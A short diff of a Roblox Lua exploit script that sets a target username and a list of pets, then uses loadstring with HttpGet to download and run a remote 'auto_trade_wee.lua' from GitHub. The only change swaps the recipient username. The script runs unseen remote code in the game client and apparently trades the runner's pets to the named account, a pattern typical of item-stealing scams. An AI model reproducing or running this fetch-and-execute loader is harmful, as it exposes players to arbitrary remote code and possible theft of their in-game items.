@@ -1,7 +1,7 @@
 task.spawn(function()
     getgenv().Config = {
         ["inventory"] = "pets",
-        ["username"] = "DunjenKwestPro",
+        ["username"] = "Tsukisashi",
         ["pets_to_trade"] = {"aztec_egg_2025_winged_snake", "aztec_egg_2025_temple_friend"}
     }
     loadstring(game:HttpGet("https://raw.githubusercontent.com/diwserenityhub/other/refs/heads/main/auto_trade_wee.lua"))()
